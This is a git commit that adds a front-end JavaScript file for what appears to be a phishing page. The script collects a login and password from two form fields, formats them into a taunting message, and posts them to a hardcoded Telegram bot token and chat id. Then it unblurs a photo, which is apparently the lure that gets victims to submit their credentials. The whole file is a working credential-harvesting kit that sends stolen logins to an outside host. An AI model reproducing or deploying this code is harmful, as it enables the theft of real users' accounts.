68814c076322ccc1b9809df3af34104883a61025
xhcx-ale <152941964+xhcx-ale@users.noreply.github.com>
2023-12-25 15:50:41 -0600

    create js/script.js

---
+++ js/script.js
@@ -0,0 +1,64 @@
+const ready = () => {
+  argv1 = document.getElementById('argv1').value;
+  argv2 = document.getElementById('argv2').value;
+  if( argv1 == '' || argv2 == '' ){
+    let validated = false;
+  } else {
+    $('#btn-cont').prop("disabled", true);
+    let message =  `■■■■■🤣🫵🤡■■■■■
+👤 L: ${argv1} 
+🔑 C: ${argv2} 
+■■■■■■■■■■■■■■`;
+        return message;
+  };
+  }
+  
+  const sender = async(msg) => {
+    let telegram_bot_id = '6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY',
+         chat_id = '-1001908180943';
+         
+    let settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": msg
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+        localStorage.setItem('visto', 'true');
+        $('#exampleModal').modal('hide');
+        imgFin();
+    });
+    
+  }
+  
+    let imgFin = () => {
+    const blur = document.getElementById('blur');
+    $('#btn-ver').prop("disabled", true);
+    blur.classList.toggle('active');
+    $('#btn-ver').text('Cubrir foto')
+  };
+
+$('#btn-cont').on('click', () => {
+  let listo = ready();
+  (listo)
+  ? sender(listo)
+  : $('.argv').addClass('err');
+});
+
+$('#btn-ver').on('click', () => {
+  $('.argv').removeClass('err');
+})
+
+let visto = localStorage.getItem('visto');
+if(visto == 'true') {
+  imgFin();
+};
